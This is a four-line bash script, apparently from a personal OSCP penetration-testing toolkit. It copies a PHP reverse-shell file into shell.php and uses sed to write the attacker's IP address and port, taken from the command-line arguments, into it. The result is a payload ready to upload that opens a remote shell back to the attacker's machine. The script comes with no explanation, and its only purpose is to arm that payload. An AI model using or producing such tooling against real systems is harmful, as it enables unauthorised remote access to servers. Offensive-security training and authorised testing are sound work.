#!/bin/bash
cp $OSCP/explotacion/reverse-shells/php-reverse/php-reverse-shell.php shell.php
sed -i -e "s/LOCAL_IP/$1/g" shell.php
sed -i -e "s/LOCAL_PORT/$2/g" shell.php